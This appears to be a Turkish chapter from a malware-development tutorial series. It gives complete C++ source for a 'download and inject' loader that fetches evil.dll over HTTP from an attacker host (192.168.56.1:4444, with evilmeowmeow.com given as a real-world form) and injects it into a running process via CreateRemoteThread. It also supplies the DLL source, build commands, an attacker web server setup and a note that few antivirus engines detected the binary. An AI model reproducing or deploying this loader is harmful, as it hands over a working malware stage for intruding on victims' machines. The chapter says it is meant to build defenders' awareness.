\newpage
\subsection{32. zararlı yazılım geliştirme tüyoları. i̇ndir ve enjekte mantığı. C++ örneği.}

﷽

![injection](./images/50/2022-04-13_18-17.png){width="80%"}    

Bu yazı, görneğierçek hayattaki zararlı yazılımlarda kullanılan ilginç bir numara üzerine yaptığım kendi araştırmaların bir sonucudur.     

### i̇ndir ve çalıştır

*"İndir ve çalıştır"* ya da bizim durumumuzda *"indir ve enjekte et"*, ilginç bir numara olup, bir URL'den payload ya da zararlı DLL indirip, bunu çalıştırmak ya da enjekte etmek için tasarlanmıştır. *"İndir/çalıştır"* (veya *"indir/enjekte et"*) yaklaşımının avantajı, yalnızca `http` dışında tüm trafiği filtreleyen ağların arkasında kullanılabilmesidir. Hatta, kimlik doğrulama bilgisi gerektirmeyen bir proxy kullanılıyorsa, önceden yapılandırılmış bir proxy üzerinden bile çalışabilir.    

### pratik örnek

İlk olarak, [klasik DLL enjeksiyonu](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) zararlı yazılımını ele alalım. En basit durumda şu şekilde görünecektir:     

```cpp
/*
* classic DLL injection example
* author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process pid
  if ( atoi(argv[1]) == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
  DWORD(atoi(argv[1])));
  rb = VirtualAllocEx(ph, NULL, evilLen, 
  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
  rt = CreateRemoteThread(ph, NULL, 0, 
  (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

Gördüğünüz gibi, oldukça basit.    
Burada, zararlı `evil.dll` dosyamızı indirmek için bazı basit bir mantık eklemek istiyorum. En basit durumda şu şekilde görünecektir:     

```cpp
// download evil.dll from url
char* getEvil() {
  HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
  INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  HINTERNET hHttpFile = InternetOpenUrl(hSession, 
  (LPCSTR)"http://192.168.56.1:4444/evil.dll", 
  0, 0, 0, 0);
  DWORD dwFileSize = 1024;
  char* buffer = new char[dwFileSize + 1];
  DWORD dwBytesRead;
  DWORD dwBytesWritten;
  HANDLE hFile = CreateFile("C:\\Temp\\evil.dll", 
  GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 
  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  do {
    buffer = new char[dwFileSize + 1];
    ZeroMemory(buffer, sizeof(buffer));
    InternetReadFile(hHttpFile, (LPVOID)buffer, 
    dwFileSize, &dwBytesRead);
    WriteFile(hFile, &buffer[0], dwBytesRead, 
    &dwBytesWritten, NULL);
    delete[] buffer;
    buffer = NULL;
  } while (dwBytesRead);

  CloseHandle(hFile);
  InternetCloseHandle(hHttpFile);
  InternetCloseHandle(hSession);
  return buffer;
}
```

Bu işlev, saldırganın makinesinden (`192.168.56.1:4444`, ancak gerçek hayatta bu `evilmeowmeow.com:80` gibi görünebilir) `evil.dll` dosyasını indirir ve `C:\\Temp\\evil.dll` dosyasına kaydeder.     

Daha sonra, bu kodu `main()` işlevinde çalıştırıyoruz. Enjektörümüzün tam kaynak kodu şu şekildedir:      

```cpp
/*
evil_inj.cpp
classic DLL injection example
author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#pragma comment (lib, "wininet.lib")

char evilDLL[] = "C:\\Temp\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// download evil.dll from url
char* getEvil() {
  HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", 
  INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  HINTERNET hHttpFile = InternetOpenUrl(hSession, 
  (LPCSTR)"http://192.168.56.1:4444/evil.dll", 
  0, 0, 0, 0);
  DWORD dwFileSize = 1024;
  char* buffer = new char[dwFileSize + 1];
  DWORD dwBytesRead;
  DWORD dwBytesWritten;
  HANDLE hFile = CreateFile("C:\\Temp\\evil.dll", 
  GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 
  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  do {
    buffer = new char[dwFileSize + 1];
    ZeroMemory(buffer, sizeof(buffer));
    InternetReadFile(hHttpFile, (LPVOID)buffer, 
    dwFileSize, &dwBytesRead);
    WriteFile(hFile, &buffer[0], dwBytesRead, 
    &dwBytesWritten, NULL);
    delete[] buffer;
    buffer = NULL;
  } while (dwBytesRead);

  CloseHandle(hFile);
  InternetCloseHandle(hHttpFile);
  InternetCloseHandle(hSession);
  return buffer;
}

// classic DLL injection logic
int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
  char* evil = getEvil();

  // parse process ID
  if ( atoi(argv[1]) == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  }
  printf("PID: %i\n", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
  DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, 
  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, 
  (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

Her zamanki gibi, basitlik adına, sadece bir mesaj kutusu açan bir DLL oluşturuyoruz:   

```cpp
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Son olarak, enjektörün tüm kodunu anladıktan sonra, bunu test edebiliriz.    

### demo

İlk olarak, DLL'i derleyelim:    

```bash
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
```

![injection](./images/50/2022-04-15_16-39.png){width="80%"}    

Daha sonra, enjektörü derleyin:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-lwininet -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![injection](./images/50/2022-04-15_16-42.png){width="80%"}    

Saldırganın makinesinde basit bir web sunucusu hazırlayın:     

```bash
python3 -m http.server 4444
```

![injection](./images/50/2022-04-16_11-55.png){width="80%"}    

Belirtilen yolun kurbanın makinesinde mevcut olduğundan emin olun (`C:\\Temp`):     

![injection](./images/50/2022-04-16_11-59.png){width="80%"}    

Son olarak, kurban sürecini `mspaint.exe` çalıştırın ve enjektör `hack.exe` çalıştırın:

```powershell
.\hack.exe <mspaint.exe's PID>
```

![injection](./images/50/2022-04-16_12-03.png){width="80%"}    

![injection](./images/50/2022-04-16_12-05.png){width="80%"}    

![injection](./images/50/2022-04-16_12-07.png){width="80%"}    

![injection](./images/50/2022-04-16_12-10.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)      

Şimdi dosyamızı VirusTotal'a yükleyelim:     

![av](./images/50/2022-04-16_12-12.png){width="80%"}    

[https://www.virustotal.com/gui/file/00e3254cdf384d5c1e15e217e89df9f78b73db7a2b0d2b7f5441c6d8be804961/detection](https://www.virustotal.com/gui/file/00e3254cdf384d5c1e15e217e89df9f78b73db7a2b0d2b7f5441c6d8be804961/detection)    

**Sonuç olarak, 69 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.**    

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.     

[InternetOpen](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena)    
[InternetOpenUrl](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)    
[InternetReadFile](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)    
[InternetCloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)    
[WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)    
[CreateFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)    
[VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)   
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)   
[CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)   
[OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)    
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)     
[LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)    

[classic DLL injection](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-04-13-malware-injection-19)    
